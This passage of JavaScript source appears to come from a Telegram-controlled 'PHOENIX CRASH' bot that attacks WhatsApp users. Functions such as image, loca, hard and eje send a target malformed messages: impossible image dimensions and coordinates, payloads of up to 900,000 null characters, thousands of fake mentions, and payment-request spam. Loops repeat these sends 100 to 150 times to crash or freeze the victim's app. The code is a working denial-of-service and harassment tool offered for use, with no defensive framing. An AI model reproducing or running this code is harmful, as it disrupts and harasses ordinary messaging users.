    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          musicContentMediaId: "589608164114571",
          songId: "870166291800508",
          author: ".VaxzyShredder",
          title: "y",
          artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
          artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
          artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
          artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
          countryBlocklist: true,
          isExplicit: true,
          artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
        },
        embeddedAction: true,
      },
    ],
  };
  
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          videoMessage,
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    },
    { 
      messageId: msg.key.id, 
      participant: { jid: target },
    }
  );
}

async function image(target) {
  const FaiqMsg = {
    image: { url: "https://files.catbox.moe/eqsjkd.jpg" },
      caption: "X",
        width: 1,
        height: 99999999999999,
       productMessage: {
        product: {
          productImage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "DqRi9X3lEDH7WJSqb6E1njeawZZkIg8DTHZgdIga+E8=",
            fileLength: "72103",
            mediaKey: "Mt4oRen73PaURrUvv9vLJTPNBQoUlbNNtVr4D7FziAw=",
            fileEncSha256: "okpg3oYPwe/ndLcMdIPy0gtyYl/wvC9WurHeekXWTOk=",
            directPath: "/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1763881206",
            width: -99999999999999999999,
            height: 1,
            jpegThumbnail: null,
            productId: "9783476898425051",
            title: "UltraX",
            description: "UltraX",
            currencyCode: "IDR",
            priceAmount1000: "X",
            retailerId: "BAN011",
            productImageCount: 2,
            salePriceAmount1000: "50000000"
            }
          },
          businessOwnerJid: target
        },
      }

  await sock.relayMessage(
    target,
    FaiqMsg,
    { messageId: null }
  )

  await sock.relayMessage(
    target,
    {
      sendPaymentMessage: {
        currencyCodeIso4217: "IDR",
        requestFrom: target,
        expiryTimestamp: null,
      }
    },
    {
      participant: { jid: target }
    }
  )
}

async function loca(target) {
   let msg = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -999.4771901,
          degreesLongitude: 999.4771901,
          name: "xnxx",
          address: "null",
          contextInfo: {
            stanzaId: "A53737D6CE47253579FA0A0CA9A94F1C",
            participant: target,
            quotedMessage: {
              conversation: "\u0000".repeat(200000)
            }
          }
        }
      }
    }
  }


   await sock.relayMessage(
        target,
        msg,
        { messageId: null }
    );

    await sock.relayMessage(
        target,
        {
            sendPaymentMessage: {
                currencyCodeIso4217: "IDR",
                requestFrom: target,
                expiryTimestamp: null
            }
        },
        {
            participant: { jid: target }
        }
    );
}

async function hard(target, mention = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, mention ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 

async function eje(target) {
  const kira = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", kira, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`Succes send bug delay to ${target}`))
}

async function delay1(target) {
for (let i = 0; i < 150; i++) {
await ZenoInvisible(target);
await gsInt(target);
await Truenullv4(sock, target, ptcp = false);
await eje(target);
await hard(target, mention = false);
await sleep(2000);
}
}

async function force1(target) {
for (let i = 0; i < 100; i++) {
await nullExc(target);
await nullExc2(target);
await loca(target);
await image(target);
await sleep(2000);
}
}

(async () => {
  console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();
  
  console.clear();
  console.log(`
=====================================
🤖 BOT TELEGRAM BERHASIL DIJALANKAN
-------------------------------------
📛 Name : PHOENIX CRASH
🆔 Author : zenn
⚙️ Library : Telegraf
🚀 Status : ONLINE
=====================================
`);
})();

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));